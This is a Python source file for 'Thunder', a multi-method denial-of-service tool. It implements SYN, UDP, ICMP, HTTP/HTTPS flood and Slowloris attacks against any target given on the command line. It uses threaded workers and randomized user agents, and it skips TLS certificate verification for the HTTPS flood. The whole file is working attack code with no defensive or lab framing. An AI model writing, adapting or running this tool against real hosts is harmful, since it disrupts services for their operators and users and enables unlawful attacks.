import argparse
import logging
import socket
import ssl
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import scapy.error
from colorama import init
from rich.logging import RichHandler
from scapy.all import ICMP, IP, TCP, send

from banner import logo
from uagents import get_random_uagent

init(autoreset=True)

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s - %(message)s",
    datefmt="%H:%M:%S",
    handlers=[RichHandler()],
)

log = logging.getLogger("rich")


def parse_url(target_url):
    parsed = urlparse(target_url)
    scheme = parsed.scheme or "http"
    host = parsed.hostname
    port = parsed.port or (443 if scheme == "https" else 80)
    path = parsed.path if parsed.path else "/"
    if parsed.query:
        path += "?" + parsed.query
    return scheme, host, port, path


def build_packet(host, path):
    user_agent = get_random_uagent()
    packet = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        f"Connection: close\r\n\r\n"
    )
    return packet.encode("utf-8")


def syn_flood(target_ip, target_port, count=100):
    log.info(f"Starting SYN Flood attack on {target_ip}:{target_port} (count={count})")
    sent = 0
    report_every = max(1, count // 10)

    for i in range(count):
        try:
            ip = IP(dst=target_ip)
            tcp = TCP(dport=target_port, flags="S")
            send(ip / tcp, verbose=0)
            sent += 1

            if (i + 1) % report_every == 0 or i == count - 1:
                log.info(f"SYN FLOOD - Sent {sent}/{count} packets")
        except (socket.timeout, socket.error, scapy.error.Scapy_Exception) as e:
            log.error(f"SYN Flood error: {e}")
        except Exception as e:
            log.error(f"SYN Flood error: {e}")

    log.info(f"SYN Flood attack finished on {target_ip}:{target_port}")


def udp_flood(target_ip, target_port, count=100):
    log.info(f"Starting UDP Flood attack on {target_ip}:{target_port} (count={count})")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)
    data = b"X" * 1024
    sent = 0
    report_every = max(1, count // 10)

    for i in range(count):
        try:
            sock.sendto(data, (target_ip, target_port))
            sent += 1

            if (i + 1) % report_every == 0 or i == count - 1:
                log.info(f"UDP FLOOD - Sent {sent}/{count} packets")
        except Exception as e:
            log.error(f"UDP Flood error: {e}")

    sock.close()
    log.info(f"UDP Flood attack finished on {target_ip}:{target_port}")


def icmp_flood(target_ip, count=100):
    log.info(f"Starting ICMP Flood attack on {target_ip} (count={count})")
    sent = 0
    report_every = max(1, count // 10)

    for i in range(count):
        try:
            packet = IP(dst=target_ip) / ICMP()
            send(packet, verbose=0)
            sent += 1

            if (i + 1) % report_every == 0 or i == count - 1:
                log.info(f"ICMP FLOOD - Sent {sent}/{count} packets")
        except (socket.timeout, socket.error, scapy.error.Scapy_Exception) as e:
                    log.error(f"ICMP Flood error: {e}")
        except Exception as e:
            log.error(f"ICMP Flood error: {e}")

    log.info(f"ICMP Flood attack finished on {target_ip}")


def create_socket(target_host, target_port, idx, sockets, log):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.settimeout(4)
        s.connect((target_host, target_port))

        s.send(f"GET /?{idx} HTTP/1.1\r\n".encode())
        s.send(f"Host: {target_host}\r\n".encode())
        sockets.append(s)
        return True
    except socket.timeout:
        log.warning(f"SLOWLORIS - Socket timeout for socket {idx}")
    except socket.error as e:
        log.error(f"SLOWLORIS - Socket error for {idx}: {e}")
    except Exception as e:
        log.critical(f"SLOWLORIS - Unexpected error for {idx}: {e}")
    return False

def replenish_sockets(sockets, target_host, target_port, num_sockets, log):
    current_count = len(sockets)
    if current_count < num_sockets:
        for idx in range(current_count, num_sockets):
            if create_socket(target_host, target_port, idx, sockets, log):
                log.info(f"SLOWLORIS - Replenished socket {idx+1}/{num_sockets}")

def send_on_sockets(sockets, log):
    dead_sockets = []
    for s in sockets:
        try:
            s.send(b"X-a: b\r\n")
        except (socket.timeout, socket.error):
            dead_sockets.append(s)
        except Exception as e:
            log.error(f"SLOWLORIS - Send error: {e}")
            dead_sockets.append(s)
    return dead_sockets

def cleanup_sockets(dead_sockets, sockets):
    for s in dead_sockets:
        if s in sockets:
            sockets.remove(s)
            try:
                s.close()
            except:
                pass

def maintain_sockets(sockets, target_host, target_port, num_sockets, log):
    pkt_count = 0
    report_every = max(1, num_sockets // 5)
    while sockets:
        replenish_sockets(sockets, target_host, target_port, num_sockets, log)

        pkt_count += 1

        dead_sockets = send_on_sockets(sockets, log)

        cleanup_sockets(dead_sockets, sockets)

        if pkt_count % report_every == 0 or pkt_count == 1:
            active = len(sockets)
            log.info(
                f"SLOWLORIS - Sent {pkt_count} headers | Active sockets: {active}/{num_sockets}"
            )

        time.sleep(10)


def slowloris_attack(target_host, target_port, num_sockets=50):
    log.info(
        f"Starting Slowloris attack on {target_host}:{target_port} (sockets={num_sockets})"
    )
    sockets = []

    for idx in range(num_sockets):
        create_socket(target_host, target_port, idx, sockets, log)
        time.sleep(0.1)

    log.info(f"SLOWLORIS - Initialized {len(sockets)}/{num_sockets} sockets")

    try:
        maintain_sockets(sockets, target_host, target_port, num_sockets, log)
    except KeyboardInterrupt:
        log.info("SLOWLORIS - Attack interrupted by user")
    finally:
        for s in sockets:
            try:
                s.close()
            except (socket.timeout, socket.error, scapy.error.Scapy_Exception) as e:
                        log.error(f"SYN Flood error: {e}")
        log.info(f"Slowloris attack finished on {target_host}:{target_port}")


def http_worker(target_url, count, ctx=None):
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query

    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {get_random_uagent()}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    for _ in range(count):
        try:
            if parsed.scheme == "https":
                with socket.create_connection((host, port), timeout=2) as sock:
                    with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                        ssock.sendall(req)
                        ssock.recv(1)
            else:
                with socket.create_connection((host, port), timeout=2) as sock:
                    sock.sendall(req)
                    sock.recv(1)
        except Exception:
            pass


def run_http_flood(target_url, packages, threads):
    log.info(
        f"Starting HTTP Flood attack on {target_url} (packages={packages}, threads={threads})"
    )

    parsed = urlparse(target_url)
    ctx = None
    if parsed.scheme == "https":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    base_count = packages // threads
    remainder = packages % threads
    counts = [base_count + 1 if i < remainder else base_count for i in range(threads)]

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for count in counts:
            futures.append(executor.submit(http_worker, target_url, count, ctx))

        completed = 0
        for future in as_completed(futures):
            future.result()
            completed += 1
            log.info(f"HTTP FLOOD - Completed worker {completed}/{threads}")

    log.info(f"HTTP Flood attack finished on {target_url}")


def run_syn_flood(host, port, count, threads):
    log.info(
        f"Starting SYN Flood attack on {host}:{port} (count={count}, threads={threads})"
    )

    base_count = count // threads
    remainder = count % threads
    counts = [base_count + 1 if i < remainder else base_count for i in range(threads)]

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for task_count in counts:
            futures.append(executor.submit(syn_flood, host, port, task_count))

        completed = 0
        for future in as_completed(futures):
            future.result()
            completed += 1
            log.info(f"SYN FLOOD - Completed worker {completed}/{threads}")

    log.info(f"SYN Flood attack finished on {host}:{port}")


def run_udp_flood(host, port, count, threads):
    log.info(
        f"Starting UDP Flood attack on {host}:{port} (count={count}, threads={threads})"
    )

    base_count = count // threads
    remainder = count % threads
    counts = [base_count + 1 if i < remainder else base_count for i in range(threads)]

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for task_count in counts:
            futures.append(executor.submit(udp_flood, host, port, task_count))

        completed = 0
        for future in as_completed(futures):
            future.result()
            completed += 1
            log.info(f"UDP FLOOD - Completed worker {completed}/{threads}")

    log.info(f"UDP Flood attack finished on {host}:{port}")


def run_icmp_flood(host, count, threads):
    log.info(f"Starting ICMP Flood attack on {host} (count={count}, threads={threads})")

    base_count = count // threads
    remainder = count % threads
    counts = [base_count + 1 if i < remainder else base_count for i in range(threads)]

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for task_count in counts:
            futures.append(executor.submit(icmp_flood, host, task_count))

        completed = 0
        for future in as_completed(futures):
            future.result()
            completed += 1
            log.info(f"ICMP FLOOD - Completed worker {completed}/{threads}")

    log.info(f"ICMP Flood attack finished on {host}")


def run_slowloris(host, port, sockets, threads):
    log.info(
        f"Starting Slowloris attack on {host}:{port} (sockets={sockets}, threads={threads})"
    )

    base_sockets = sockets // threads
    remainder = sockets % threads
    counts = [
        base_sockets + 1 if i < remainder else base_sockets for i in range(threads)
    ]

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for sock_count in counts:
            futures.append(executor.submit(slowloris_attack, host, port, sock_count))

        completed = 0
        for future in as_completed(futures):
            future.result()
            completed += 1
            log.info(f"SLOWLORIS - Completed worker {completed}/{threads}")

    log.info(f"Slowloris attack finished on {host}:{port}")


if __name__ == "__main__":
    logo()
    parser = argparse.ArgumentParser(description="Thunder (multi-attack)")
    parser.add_argument("target", help="Target url (http or https)")
    parser.add_argument("--port", help="Port", type=int, default=None)
    parser.add_argument(
        "-pkgs", "--packages", help="Packages count", type=int, default=1000
    )
    parser.add_argument("-t", "--threads", help="Threads count", type=int, default=10)
    parser.add_argument("--https", help="Use https flood", action="store_true")
    parser.add_argument("--syn", help="Use SYN flood", action="store_true")
    parser.add_argument("--udp", help="Use UDP flood", action="store_true")
    parser.add_argument("--icmp", help="Use ICMP flood", action="store_true")
    parser.add_argument("--slowloris", help="Use slowloris flood", action="store_true")
    args = parser.parse_args()

    parsed_url = urlparse(args.target)
    host = parsed_url.hostname
    web_port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
    port = args.port or web_port

    attack_tasks = []

    if args.syn:
        attack_tasks.append((run_syn_flood, (host, port, args.packages, args.threads)))
    if args.https:
        attack_tasks.append(
            (run_http_flood, (args.target, args.packages, args.threads))
        )
    if args.udp:
        attack_tasks.append((run_udp_flood, (host, port, args.packages, args.threads)))
    if args.icmp:
        attack_tasks.append((run_icmp_flood, (host, args.packages, args.threads)))
    if args.slowloris:
        attack_tasks.append(
            (run_slowloris, (host, web_port, args.packages, args.threads))
        )

    if not attack_tasks:
        attack_tasks.append(
            (run_http_flood, (args.target, args.packages, args.threads))
        )

    log.info(
        f"Starting {len(attack_tasks)} attack tasks with {args.threads} threads each..."
    )

    with ThreadPoolExecutor(max_workers=len(attack_tasks)) as executor:
        futures = []
        for func, args_tuple in attack_tasks:
            futures.append(executor.submit(func, *args_tuple))

        for i, future in enumerate(as_completed(futures), 1):
            try:
                future.result()
                log.info(f"Attack task {i}/{len(attack_tasks)} completed")
            except Exception as e:
                log.error(f"Attack task {i} failed: {e}")

    log.info("All attacks finished.")
